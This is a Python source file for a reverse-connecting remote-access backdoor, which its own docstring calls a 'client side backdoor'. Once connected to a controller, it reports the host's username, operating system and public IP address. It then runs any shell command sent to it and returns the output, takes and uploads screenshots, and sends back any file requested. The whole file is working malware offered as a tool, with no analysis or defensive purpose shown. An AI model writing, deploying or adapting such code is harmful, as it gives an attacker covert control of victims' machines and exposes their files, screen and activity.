# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM
from getpass import getuser
from datetime import datetime
from pyscreenshot import grab
from pathlib import Path
from pickle import dumps
from subprocess import getoutput
from requests import get, packages
from os import uname, chdir, getcwd
from time import sleep
#from requests.packages.urllib3.exceptions import InsecureRequestWarning

#packages.urllib3.disable_warnings(InsecureRequestWarning)

class Client(object):
    """ client side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
        self.__Address = (host, port)
        self.screenshotPath = '/home/znairy/736f6e61726973.png'
        
    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    def screenshot(self, args):
        grab().save(self.screenshotPath)
        namefile, extension, file = self.splitFile(self.screenshotPath)

        header = {
            "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
            "extension": extension,
            "bytes": len(file),
            "path": "screenshots"
        }

        self.__Client.send(dumps(header))
        sleep(1)
        self.__Client.send(file)

    def splitFile(self, path):
        with open(path, 'rb') as file:
            return Path(path).stem, Path(path).suffix, file.read()

    def sendFile(self, file):
        self.__Client.send(file)

    def sendHeader(self, header):
        self.__Client.send(dumps(header))

    def changeDirectory(self, directory):
        try:
            chdir(directory)
            self.sendCommand(self.lastCommand, '.')
        except FileNotFoundError:
            self.sendCommand(self.lastCommand)

    def download(self, arg):
        if Path(arg).is_file():
            namefile, extension, file = self.splitFile(arg)
            header = {
                "namefile": namefile,
                "extension": extension,
                "bytes": len(file),
                "path": "files",
                "exists": True
            }

            self.sendHeader(header)
            sleep(1)
            self.sendFile(file)

        else:
            self.sendHeader({"namefile":arg, "exists": False})

    def allCommands(self):
        return {
            "/screenshot": {"action": self.screenshot},
            "/download": {"action": self.download},
            "cd": {"action":  self.changeDirectory}
        }

    def splitCommand(self, command):
        if self.allCommands().get(command.split()[0]):
            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #

        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])

    def outputCommand(self, command):
        return getoutput(command).encode()
    
    def sendCommand(self, command, customOutput=''):
        if not customOutput:
            output = self.outputCommand(command)
        else:
            output = customOutput.encode()

        header = {
            "time": datetime.now().strftime('%M %S').split(),
            "bytes": len(output),
            "currentDirectory": getcwd()
        }
        
        self.sendHeader(header)
        sleep(0.5)
        self.__Client.send(output)
    
    def runCommand(self, cmd):
        command, args = self.splitCommand(cmd)

        if command:
            command['action'](args.strip())
        else:
            self.sendCommand(cmd)

    def listenServer(self):
        while True:
            command = self.__Client.recv(512)
            if command:
                self.lastCommand = command
                self.runCommand(command.decode('utf-8'))
            else:
                self.run()

    def identifier(self):
        try:
            eAddress = get('https://api.ipify.org?format=text').content.decode()
        except Exception:
            eAddress = ''
        
        return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress, "currentDirectory": getcwd()})

    def connect(self):
        try:
            self.__Client.connect((self.__Address))
            self.__Client.send(self.identifier())
            
        except ConnectionRefusedError:
            sleep(1);self.connect()

    def configureSocket(self):
        self.__Client = socket(AF_INET, SOCK_STREAM)

    def run(self):
        self.configureSocket()
        self.connect()
        
        self.listenServer()


def main():
    client = Client('127.0.0.1', 5000)
    client.run()

if __name__ == '__main__':
    main()
